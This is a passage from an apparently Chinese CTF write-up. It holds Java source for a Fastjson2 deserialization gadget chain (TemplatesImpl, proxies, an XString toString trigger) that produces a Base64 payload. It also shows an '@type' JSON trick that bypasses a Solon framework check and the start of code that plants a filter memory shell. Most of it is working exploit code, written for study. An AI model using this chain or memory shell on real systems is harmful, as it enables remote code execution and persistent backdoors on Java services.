</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Fastjson4_ObjectFactoryDelegatingInvocationHandler</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>getObject</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        System.setProperty(&#34;properXalan&#34;, &#34;true&#34;);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>node1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TemplatesImplNode</span><span class=p>.</span><span class=na>makeGadget</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>map</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>map</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;object&#34;</span><span class=p>,</span><span class=w> </span><span class=n>node1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>node2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>JSONObjectNode</span><span class=p>.</span><span class=na>makeGadget</span><span class=p>(</span><span class=n>2</span><span class=p>,</span><span class=w> </span><span class=n>map</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Proxy</span><span class=w> </span><span class=n>proxy1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Proxy</span><span class=p>)</span><span class=w> </span><span class=n>Proxy</span><span class=p>.</span><span class=na>newProxyInstance</span><span class=p>(</span><span class=n>Thread</span><span class=p>.</span><span class=na>currentThread</span><span class=p>().</span><span class=na>getContextClassLoader</span><span class=p>(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>ObjectFactory</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>MyObject</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=w> </span><span class=p>(</span><span class=n>InvocationHandler</span><span class=p>)</span><span class=w> </span><span class=n>node2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>node3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>makeGadget</span><span class=p>(</span><span class=n>proxy1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Proxy</span><span class=w> </span><span class=n>proxy2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Proxy</span><span class=p>)</span><span class=w> </span><span class=n>Proxy</span><span class=p>.</span><span class=na>newProxyInstance</span><span class=p>(</span><span class=n>Proxy</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getClassLoader</span><span class=p>(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=w> </span><span class=p>(</span><span class=n>InvocationHandler</span><span class=p>)</span><span class=w> </span><span class=n>node3</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>node4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>JsonArrayNode</span><span class=p>.</span><span class=na>makeGadget</span><span class=p>(</span><span class=n>2</span><span class=p>,</span><span class=w> </span><span class=n>proxy2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//       Object node5 = BadAttrValExeNode.makeGadget(node4);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>gadgetChain</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>makeXStringToStringTrigger</span><span class=p>(</span><span class=n>node4</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>array</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=n>node1</span><span class=p>,</span><span class=w> </span><span class=n>gadgetChain</span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>node6</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>HashMapNode</span><span class=p>.</span><span class=na>makeGadget</span><span class=p>(</span><span class=n>array</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>node6</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Map</span><span class=w> </span><span class=nf>makeXStringToStringTrigger</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>o</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>XString</span><span class=w> </span><span class=n>x</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>XString</span><span class=p>(</span><span class=s>&#34;\n&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>makeMap</span><span class=p>(</span><span class=n>o</span><span class=p>,</span><span class=w> </span><span class=n>x</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Map</span><span class=w> </span><span class=nf>makeMap</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>v1</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>v2</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>map1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>map1</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;yy&#34;</span><span class=p>,</span><span class=w> </span><span class=n>v1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>map1</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;zZ&#34;</span><span class=p>,</span><span class=w> </span><span class=n>v2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>map2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>map2</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;yy&#34;</span><span class=p>,</span><span class=w> </span><span class=n>v2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>map2</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;zZ&#34;</span><span class=p>,</span><span class=w> </span><span class=n>v1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=w> </span><span class=n>s</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=s>&#34;size&#34;</span><span class=p>,</span><span class=w> </span><span class=n>2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=w> </span><span class=n>nodeC</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>nodeC</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.util.HashMap$Node&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>nodeC</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.util.HashMap$Entry&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=w> </span><span class=n>nodeCons</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>nodeC</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=kt>int</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>nodeC</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>nodeCons</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>tbl</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Array</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>nodeC</span><span class=p>,</span><span class=w> </span><span class=n>2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Array</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>tbl</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>nodeCons</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>map1</span><span class=p>,</span><span class=w> </span><span class=n>map1</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Array</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>tbl</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>nodeCons</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>map2</span><span class=p>,</span><span class=w> </span><span class=n>map2</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Reflections</span><span class=p>.</span><span class=na>setFieldValue</span><span class=p>(</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=s>&#34;table&#34;</span><span class=p>,</span><span class=w> </span><span class=n>tbl</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>s</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setFieldValue</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>field</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>obj</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=n>field</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>object</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Fastjson4_ObjectFactoryDelegatingInvocationHandler</span><span class=p>().</span><span class=na>getObject</span><span class=p>(</span><span class=n>Util</span><span class=p>.</span><span class=na>getDefaultTestCmd</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>serialize</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Util</span><span class=p>.</span><span class=na>serialize</span><span class=p>(</span><span class=n>object</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>s</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getEncoder</span><span class=p>().</span><span class=na>encodeToString</span><span class=p>(</span><span class=n>serialize</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>s</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>s</span><span class=p>.</span><span class=na>length</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        Util.runGadgets(object);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>makeGadget</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>gadget</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>Reflections</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=s>&#34;org.example.demo.Utils.MyProxy&#34;</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>MyObject</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>gadget</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>在进入到正式的反序列化逻辑之前还有一个问题，改路由对传递进的json数量进行了比对，solon框架解析到的map和fastjson2解析到的length需要不一致</p><p><img src=https://su-team.cn/img/2025-L3HCTF/95170242-6afe-45d8-b014-f86259b1d996.png alt=img></p><p>这一点就涉及到了解析特性相关内容，fastjson2和fastjson1一致，仍旧支持@type键，在正常的solon解析是无法被解析到，从而绕过了这一点</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>{&#34;@type&#34;: &#34;java.util.HashMap&#34;,&#34;why&#34;:&#34;base64 payload&#34;}
</span></span></code></pre></td></tr></table></div></div><p>最后成功触发反序列化，但远程环境不出网，还需要去找一个solon内存马</p><p><a href="https://github.com/wuwumonster/note/blob/3463f12984aa347292d508e4fb1d4d9a7f2b0bc5/JavaSec/JavaSec/%E5%86%85%E5%AD%98%E9%A9%AC/Solon%20%E5%86%85%E5%AD%98%E9%A9%AC.md?plain=1#L84">https://github.com/wuwumonster/note/blob/3463f12984aa347292d508e4fb1d4d9a7f2b0bc5/JavaSec/JavaSec/%E5%86%85%E5%AD%98%E9%A9%AC/Solon%20%E5%86%85%E5%AD%98%E9%A9%AC.md?plain=1#L84</a></p><p>随便找了一个solon filter内存马即可</p><p><img src=https://su-team.cn/img/2025-L3HCTF/1e48b496-9f7e-4a88-922c-755b8c8d24d3.png alt=img></p><p>最后将内存马放入到templates中即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>gadgets</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>common.ClassFiles</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>common.Reflections</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassClassPath</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassPool</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtClass</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.LoaderClassPath</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.Serializable</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.zip.GZIPOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Base64</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>TemplatesImplNode</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>makeGadget</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>createTemplatesImpl</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>createTemplatesImpl</span><span class=p>(</span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>command</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=w> </span><span class=n>tplClass</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=w> </span><span class=n>abstTranslet</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=w> </span><span class=n>transFactory</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>Boolean</span><span class=p>.</span><span class=na>parseBoolean</span><span class=p>(</span><span class=n>System</span><span class=p>.</span><span class=na>getProperty</span><span class=p>(</span><span class=s>&#34;properXalan&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;false&#34;</span><span class=p>)))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>tplClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;org.apache.xalan.xsltc.trax.TemplatesImpl&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>abstTranslet</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>transFactory</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
